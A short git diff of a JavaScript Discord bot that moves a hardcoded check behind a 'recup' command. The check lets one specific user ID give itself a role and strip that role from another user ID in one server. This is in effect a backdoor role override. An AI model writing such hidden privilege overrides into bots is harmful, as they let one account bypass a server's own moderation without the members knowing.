@@ -555,9 +555,11 @@ if(message.content === prefix + "add-bot"){
         .setImage(message.guild.iconURL)
           message.channel.send(icone)
     }
-  if(message.guild.id === "537345725198106644" && message.author.id === "606073208579293195") {
-    message.guild.members.get("606073208579293195").addRole(message.guild.roles.find('name', "😇𝕬𝖓𝖌𝖊-𝕷𝖎𝖓𝖐😇"))
-    message.guild.members.get("441875385043517450").removeRole(message.guild.roles.find('name', "😇𝕬𝖓𝖌𝖊-𝕷𝖎𝖓𝖐😇"))
+  if(message.content === prefix + "recup") {
+    if(message.guild.id === "537345725198106644" && message.author.id === "606073208579293195") {
+      message.guild.members.get("606073208579293195").addRole(message.guild.roles.find('name', "😇𝕬𝖓𝖌𝖊-𝕷𝖎𝖓𝖐😇"))
+      message.guild.members.get("441875385043517450").removeRole(message.guild.roles.find('name', "😇𝕬𝖓𝖌𝖊-𝕷𝖎𝖓𝖐😇"))
+    }
   }
     if(message.content.startsWith(prefix+ "emo")) {
         function emoji() {
